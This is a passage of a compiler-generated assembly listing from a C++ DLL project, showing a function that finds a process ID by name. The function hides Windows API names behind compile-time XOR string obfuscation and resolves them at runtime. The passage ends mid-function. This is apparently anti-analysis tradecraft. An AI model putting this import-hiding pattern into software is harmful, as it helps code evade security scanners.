??R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ ENDP ; `ProcessUtilities::Init'::`2'::<lambda_1>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
this$dead$ = 48
?dtor$0@?0???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@4HA PROC ; ``ProcessUtilities::Init'::`2'::<lambda_1>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@4HA ENDP ; ``ProcessUtilities::Init'::`2'::<lambda_1>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
??__Fobfuscated_data@?1???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@YAXXZ PROC ; ``ProcessUtilities::Init'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	rax, QWORD PTR gs:88
	mov	ecx, DWORD PTR _tls_index
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@4V45@A
	add	rdx, QWORD PTR [rax+rcx*8]

; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	mov	QWORD PTR [rdx], rax
	mov	DWORD PTR [rdx+8], eax
	ret	0
??__Fobfuscated_data@?1???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@YAXXZ ENDP ; ``ProcessUtilities::Init'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
;	COMDAT ?__autoclassinit2@?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAAX_K@Z
_TEXT	SEGMENT
this$ = 8
classSize$dead$ = 16
?__autoclassinit2@?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAAX_K@Z PROC ; std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::__autoclassinit2, COMDAT
	xor	eax, eax
	mov	QWORD PTR [rcx], rax
	ret	0
?__autoclassinit2@?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAAX_K@Z ENDP ; std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::__autoclassinit2
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ?PIDFromName@ProcessUtilities@@YAKPEBD@Z
_TEXT	SEGMENT
$T1 = 32
$T2 = 32
$T3 = 32
obfuscator$4 = 40
$T5 = 72
obfuscator$6 = 80
$T7 = 96
$T8 = 128
$T9 = 160
$T10 = 192
$T11 = 224
processEntry$ = 256
__$ArrayPad$ = 832
name$ = 896
?PIDFromName@ProcessUtilities@@YAKPEBD@Z PROC		; ProcessUtilities::PIDFromName, COMDAT

; 124  : DWORD ProcessUtilities::PIDFromName(const char* name) {

$LN235:
	mov	QWORD PTR [rsp+8], rbx
	mov	QWORD PTR [rsp+16], rsi
	mov	QWORD PTR [rsp+24], rdi
	push	rbp
	push	r12
	push	r13
	push	r14
	push	r15
	lea	rbp, QWORD PTR [rsp-592]
	sub	rsp, 848				; 00000350H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rbp-256], rax
	mov	r12, rcx

; 125  : 	// take snapshot of all current running processes
; 126  : 
; 127  : 	HMODULE kernel32 = GetLoadedLib(freqDLLS::kernel32);

	lea	rdx, OFFSET FLAT:?kernel32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
	lea	rcx, QWORD PTR $T7[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rcx, rax
	call	?GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetLoadedLib
	mov	rsi, rax

; 128  : 	PPROCFN::_CreateToolhelp32Snapshot _CreateToolhelp32Snapshot = GetFunctionAddress<PPROCFN::_CreateToolhelp32Snapshot>(kernel32, std::string(HIDE("CreateToolhelp32Snapshot")));

	movdqa	xmm0, XMMWORD PTR __xmm@434c2d63eef5f7881e2b387beaf8e9a4
	movdqu	XMMWORD PTR obfuscator$4[rsp], xmm0
	mov	DWORD PTR obfuscator$4[rsp+16], -67308108 ; fbfcf5b4H
	mov	DWORD PTR obfuscator$4[rsp+20], 84948348 ; 0510357cH
	mov	BYTE PTR obfuscator$4[rsp+24], -25
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	lea	r14, QWORD PTR [rax+rcx*8]
	mov	rdi, QWORD PTR [r14]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdi]
	mov	ebx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@4V45@A
	add	rbx, rdi
	test	al, 1
	jne	SHORT $LN195@PIDFromNam
	or	eax, 1
	mov	DWORD PTR [rcx+rdi], eax
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rbx+25], 1
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 128  : 	PPROCFN::_CreateToolhelp32Snapshot _CreateToolhelp32Snapshot = GetFunctionAddress<PPROCFN::_CreateToolhelp32Snapshot>(kernel32, std::string(HIDE("CreateToolhelp32Snapshot")));

	lea	rax, QWORD PTR [rbx+24]
	lea	rcx, QWORD PTR obfuscator$4[rsp+24]
	cmp	rbx, rcx
	ja	SHORT $LN162@PIDFromNam
	lea	rcx, QWORD PTR obfuscator$4[rsp]
	cmp	rax, rcx
	jb	SHORT $LN162@PIDFromNam

; 129  : 	PPROCFN::_Process32FirstW          _Process32FirstW = GetFunctionAddress<PPROCFN::_Process32FirstW>(kernel32, std::string(HIDE("Process32FirstW")));

	movups	XMMWORD PTR [rbx], xmm0
	movsd	xmm0, QWORD PTR obfuscator$4[rsp+16]
	movsd	QWORD PTR [rbx+16], xmm0
	mov	BYTE PTR [rbx+24], 231			; 000000e7H
	jmp	SHORT $LN205@PIDFromNam
$LN162@PIDFromNam:

; 128  : 	PPROCFN::_CreateToolhelp32Snapshot _CreateToolhelp32Snapshot = GetFunctionAddress<PPROCFN::_CreateToolhelp32Snapshot>(kernel32, std::string(HIDE("CreateToolhelp32Snapshot")));

	movups	XMMWORD PTR [rbx], xmm0
	movsd	xmm0, QWORD PTR obfuscator$4[rsp+16]
	movsd	QWORD PTR [rbx+16], xmm0
	mov	BYTE PTR [rbx+24], 231			; 000000e7H
$LN205@PIDFromNam:
	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
$LN195@PIDFromNam:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 140  : 			decrypt();

	mov	rcx, rbx
	call	?decrypt@?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAAXXZ ; ay::obfuscated_data<25,8178357769676364775,char>::decrypt
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 128  : 	PPROCFN::_CreateToolhelp32Snapshot _CreateToolhelp32Snapshot = GetFunctionAddress<PPROCFN::_CreateToolhelp32Snapshot>(kernel32, std::string(HIDE("CreateToolhelp32Snapshot")));

	mov	rdx, rbx
	lea	rcx, QWORD PTR $T8[rbp-256]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rbx, rax
	mov	QWORD PTR $T2[rsp], rax
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	mov	rdx, rax
	lea	rcx, QWORD PTR $T9[rbp-256]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	mov	rcx, rsi
	call	?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::_GetFuncAddress
	mov	QWORD PTR $T1[rsp], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rbx+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN94@PIDFromNam

; 4869 :             _ASAN_STRING_REMOVE(*this);
; 4870 :             auto& _Al = _Getal();
; 4871 :             _Deallocate_for_capacity(_Al, _My_data._Bx._Ptr, _My_data._Myres);

	mov	rcx, QWORD PTR [rbx]

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN108@PIDFromNam

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	$LN105@PIDFromNam

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN108@PIDFromNam:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN94@PIDFromNam:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rbx+16], 0

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rbx], 0
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 129  : 	PPROCFN::_Process32FirstW          _Process32FirstW = GetFunctionAddress<PPROCFN::_Process32FirstW>(kernel32, std::string(HIDE("Process32FirstW")));

	movdqa	xmm0, XMMWORD PTR __xmm@e528cb6c095e11a3d60ccc7a185825c1
	movdqu	XMMWORD PTR obfuscator$6[rsp], xmm0
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdi]
	mov	ebx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN217@PIDFromNam
	or	eax, 1
	mov	DWORD PTR [rcx+rdi], eax
	lea	rax, QWORD PTR [rbx+rdi]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rax+16], 1
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 129  : 	PPROCFN::_Process32FirstW          _Process32FirstW = GetFunctionAddress<PPROCFN::_Process32FirstW>(kernel32, std::string(HIDE("Process32FirstW")));

	lea	rcx, QWORD PTR [rax+15]
	lea	rdx, QWORD PTR obfuscator$6[rsp+15]
	cmp	rax, rdx
	ja	SHORT $LN165@PIDFromNam
	lea	rdx, QWORD PTR obfuscator$6[rsp]
	cmp	rcx, rdx
	jb	SHORT $LN165@PIDFromNam
	movups	XMMWORD PTR [rax], xmm0
	jmp	SHORT $LN206@PIDFromNam
$LN165@PIDFromNam:
	movups	XMMWORD PTR [rax], xmm0
$LN206@PIDFromNam:
	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
$LN217@PIDFromNam:
	lea	r11, QWORD PTR [rdi+rbx]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 140  : 			decrypt();

	mov	rcx, r11
	call	?decrypt@?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAAXXZ ; ay::obfuscated_data<16,-1909597575049685103,char>::decrypt
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 129  : 	PPROCFN::_Process32FirstW          _Process32FirstW = GetFunctionAddress<PPROCFN::_Process32FirstW>(kernel32, std::string(HIDE("Process32FirstW")));

	mov	rdx, r11
	lea	rcx, QWORD PTR $T10[rbp-256]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	mov	rcx, rsi
	call	??$GetFunctionAddress@P6AHPEAXPEAUtagPROCESSENTRY32W@@@Z@ProcessUtilities@@YAP6AHPEAXPEAUtagPROCESSENTRY32W@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetFunctionAddress<int (__cdecl*)(void *,tagPROCESSENTRY32W *)>
	mov	r13, rax

; 130  : 	PPROCFN::_Process32NextW           _Process32NextW = GetFunctionAddress<PPROCFN::_Process32NextW>(kernel32, std::string(HIDE("Process32NextW")));

	mov	eax, OFFSET FLAT:??__J?1???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@51
	mov	ecx, DWORD PTR [rax+rdi]
	mov	ebx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@4V45@A
	test	cl, 1
	jne	SHORT $LN196@PIDFromNam
	or	ecx, 1
	mov	DWORD PTR [rax+rdi], ecx
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	DWORD PTR [rdi+rbx+12], 30355483	; 01cf301bH
	mov	DWORD PTR [rdi+rbx], -1829089843	; 92fa4dcdH
	mov	DWORD PTR [rdi+rbx+4], 347870218	; 14bc140aH
	mov	DWORD PTR [rdi+rbx+8], -1980730961	; 89f071afH
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 130  : 	PPROCFN::_Process32NextW           _Process32NextW = GetFunctionAddress<PPROCFN::_Process32NextW>(kernel32, std::string(HIDE("Process32NextW")));

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_3>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
$LN196@PIDFromNam:
	lea	r9, QWORD PTR [rbx+rdi]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [r9+15], 0
	je	$LN138@PIDFromNam

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	edx, edx
	cmp	DWORD PTR __isa_available, 5
	jl	$LN228@PIDFromNam

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movdqa	xmm3, XMMWORD PTR __xmm@27cf676ff1953f9d27cf676ff1953f9d
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [r9]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [r9], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [r9+2]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [r9+2], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [r9+4]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [r9+4], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [r9+6]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [r9+6], ax

; 68   : 		for ( size_type i = 0; i < size; i++ )

	mov	edx, 8
$LN228@PIDFromNam:
	mov	r10, 2868625218150416285		; 27cf676ff1953f9dH
	npad	3
$LL225@PIDFromNam:

; 69   : 		{
; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, dl
	and	cl, 7
	shl	cl, 3
	mov	r8, r10
	shr	r8, cl
	xor	BYTE PTR [rdx+r9], r8b

; 68   : 		for ( size_type i = 0; i < size; i++ )

	inc	rdx
	cmp	rdx, 15
	jb	SHORT $LL225@PIDFromNam

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r9+15], 0
$LN138@PIDFromNam:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 130  : 	PPROCFN::_Process32NextW           _Process32NextW = GetFunctionAddress<PPROCFN::_Process32NextW>(kernel32, std::string(HIDE("Process32NextW")));

	mov	rdx, r9
	lea	rcx, QWORD PTR $T11[rbp-256]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	mov	rcx, rsi
	call	??$GetFunctionAddress@P6AHPEAXPEAUtagPROCESSENTRY32W@@@Z@ProcessUtilities@@YAP6AHPEAXPEAUtagPROCESSENTRY32W@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetFunctionAddress<int (__cdecl*)(void *,tagPROCESSENTRY32W *)>
	mov	r15, rax

; 134  : 	HANDLE         processSnapshot = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	xor	edx, edx
	mov	ecx, 2

; 131  : 
; 132  : 	PROCESSENTRY32 processEntry;
; 133  : 	DWORD          processID = -1;

	mov	r14d, -1				; ffffffffH

; 134  : 	HANDLE         processSnapshot = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	call	QWORD PTR $T1[rsp]
	mov	rsi, rax

; 135  : 
; 136  : 	if ( processSnapshot == INVALID_HANDLE_VALUE ) {

	cmp	rax, -1
	je	$LN232@PIDFromNam

; 137  : 		return -1;
; 138  : 	}
; 139  : 
; 140  : 	processEntry.dwSize = sizeof(PROCESSENTRY32);

	mov	DWORD PTR processEntry$[rbp-256], 568	; 00000238H

; 141  : 
; 142  : 	// process the first file in the snapshot, put information in processEntry
; 143  : 	if ( !_Process32FirstW(processSnapshot, &processEntry) ) {

	lea	rdx, QWORD PTR processEntry$[rbp-256]
	mov	rcx, rax
	call	r13
	test	eax, eax
	je	$LN3@PIDFromNam
$LL4@PIDFromNam:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h

; 916  :     return ::operator new(sz);

	mov	ecx, 24
	call	??2@YAPEAX_K@Z				; operator new
	mov	rbx, rax
	mov	QWORD PTR $T5[rsp], rax

; 321  :     : m_Data(new Data_t(s))

	test	rax, rax
	je	SHORT $LN17@PIDFromNam
	xorps	xmm0, xmm0
	xor	eax, eax
	movups	XMMWORD PTR [rbx], xmm0
	mov	QWORD PTR [rbx+16], rax

; 689  :     : m_str(NULL), m_RefCount(1)

	mov	QWORD PTR [rbx+8], rax
	mov	DWORD PTR [rbx+16], 1

; 690  : {
; 691  :     m_wstr = ::SysAllocString(s);

	lea	rcx, QWORD PTR processEntry$[rbp-212]
	call	QWORD PTR __imp_SysAllocString
	mov	QWORD PTR [rbx], rax

; 692  : 
; 693  :     if (m_wstr == NULL && s != NULL) {

	test	rax, rax
	je	$LN214@PIDFromNam
	jmp	SHORT $LN18@PIDFromNam
$LN17@PIDFromNam:

; 321  :     : m_Data(new Data_t(s))

	xor	ebx, ebx
$LN18@PIDFromNam:
	mov	QWORD PTR $T3[rsp], rbx
	test	rbx, rbx

; 322  : {
; 323  :     if (m_Data == NULL) {

	je	$LN151@PIDFromNam

; 825  :     if (m_str == NULL) {

	mov	rax, QWORD PTR [rbx+8]
	test	rax, rax
	jne	SHORT $LN35@PIDFromNam

; 826  :         m_str = _com_util::ConvertBSTRToString(m_wstr);

	mov	rcx, QWORD PTR [rbx]
	call	?ConvertBSTRToString@_com_util@@YAPEADPEA_W@Z ; _com_util::ConvertBSTRToString
	mov	QWORD PTR [rbx+8], rax
$LN35@PIDFromNam:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 152  : 		if ( strcmp(name, _bstr_t(processEntry.szExeFile)) == 0 ) {

	mov	rcx, r12
	sub	rax, r12
$LL222@PIDFromNam:
	movzx	edx, BYTE PTR [rcx]
	cmp	dl, BYTE PTR [rcx+rax]
	jne	SHORT $LN224@PIDFromNam
	inc	rcx
	test	dl, dl
	jne	SHORT $LL222@PIDFromNam
	xor	edi, edi
	jmp	SHORT $LN223@PIDFromNam
$LN224@PIDFromNam:
	sbb	edi, edi
	or	edi, 1
$LN223@PIDFromNam:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h

